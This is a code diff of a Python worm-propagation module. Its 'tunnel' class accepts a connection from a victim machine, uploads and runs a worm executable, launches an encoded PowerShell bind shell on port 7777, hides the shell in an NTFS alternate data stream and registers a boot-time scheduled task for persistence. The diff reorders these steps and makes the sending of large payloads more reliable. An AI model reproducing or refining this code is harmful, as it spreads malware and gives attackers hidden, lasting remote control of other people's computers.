@@ -13,7 +13,6 @@ class tunnel(threading.Thread):
         self.sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
         self.sock.bind((self.lhost,self.lport))
         self.sock.listen(5)
-        self.complete = False
         print("Establishing Tunnel - listening on port {}".format(self.lport))
         self.connection = {}
         super().__init__()
@@ -22,12 +21,13 @@ class tunnel(threading.Thread):
     def run(self):
         print("accepting traffic on port {}".format(self.lport))
         conn, addr = self.sock.accept()
-        conn.settimeout(5.0)
+        conn.settimeout(10)
         self.set_connection(conn,addr)
         print("Got a connection from: {}",addr)
         self.deploy_virus(self.worm.getfiledata(),conn)
         self.create_persistence(conn)
-        self.complete = True
+        conn.close()
+        self.sock.close()
     
     
     def sent_command(self, command, conn):
@@ -35,10 +35,19 @@ class tunnel(threading.Thread):
         conn.send(command)
         time.sleep(1)
         
-    def get_response(self,conn):
-        response = conn.recv(1024).decode()
+    def sent_large_command(self, command, conn):
+        #print(command)
+        total_sent = 0
+        while total_sent < len(command):
+            sent = conn.send(command[total_sent:])
+            if sent == 0:
+                raise RuntimeError("socket connection broken")
+            total_sent = total_sent + sent
+        
+    def get_response(self,conn,size=1024):
+        response = conn.recv(size).decode()
         return response
-    
+
     def get_done(self):
         return self.complete
     # def delivery_virus(self, target_ip, virus):
@@ -72,24 +81,24 @@ class tunnel(threading.Thread):
 
     def create_persistence(self, conn):
         #creating a backdoor access on the remote server
-        command = b'Set-Content -path "$env:temp\\remain.tmp:hidden" -Value "'
-        command += self.generate_base64_bind_shell_code("windows").encode()
-        command += b'"'
-        self.sent_command(command,conn)
-        print("Store Base64 Bind Shell in Temp Folder")
-        print(self.get_response(conn))
-        
-        command = b'schtasks /create /tn "reminderr" /tr "powershell -Command \"$command=get-content $env:\\temp:hidden; powershell -encodedcommand $command\"" /sc onstart'
-        self.sent_command(command,conn)
-        print("Create a Schedule Tasks to Start the Bind Shell on Boot")
-        print(self.get_response(conn))
-        
         command = b"powershell -encodedcommand "
         command += self.generate_base64_bind_shell_code("windows").encode()
         command+=b"\n"
         self.sent_command(command,conn)
         print("Create a Bind Shell on Port 7777")
-        print(self.get_response(conn))
+        print(self.get_response(conn,5120))
+
+        command = b'Set-Content -path "$env:temp\\remain.tmp:hidden" -Value "'
+        command += self.generate_base64_bind_shell_code("windows").encode()
+        command += b'"'
+        self.sent_large_command(command,conn)
+        print("Store Base64 Bind Shell in Temp Folder")
+        print(self.get_response(conn,5120))
+        
+        command = b'schtasks /create /tn "reminderr" /tr "powershell -Command \"$command=get-content $env:\\temp:hidden; powershell -encodedcommand $command\"" /sc onstart'
+        self.sent_command(command,conn)
+        print("Create a Schedule Tasks to Start the Bind Shell on Boot")
+        print(self.get_response(conn,1024))
     
     def deploy_virus(self, data, conn, ostype="windows"):
         #print(data)
@@ -106,11 +115,11 @@ class tunnel(threading.Thread):
         #start command sequence
         try:
             print("Start Deploying worm to Windows")
-            command = "cd \\users".encode()
+            command = "cd \\Users\Public".encode()
             command+=b"\n"
             self.sent_command(command,conn)
             print("change to users directory")
-            print(self.get_response(conn))
+            print(self.get_response(conn,1024))
             command = "powershell".encode()
             command+=b"\n"
             self.sent_command(command,conn)
@@ -133,12 +142,12 @@ class tunnel(threading.Thread):
             command+=b"\n"
             self.sent_command(command,conn)
             print("target machine is starting to connect to the us")
-            print("Target Response: {}".format(self.get_response(conn)))
+            print("Target Response: {}".format(self.get_response(conn,1024)))
             time.sleep(5)
             command = "./{}_tworm.exe".format(self.lhost).encode()
             command+=b"\n"
             self.sent_command(command,conn)
-            print("Target Response: {}".format(self.get_response(conn)))
+            print("Target Response: {}".format(self.get_response(conn,1024)))
             
         except TimeoutError as t:
             print("no Response")
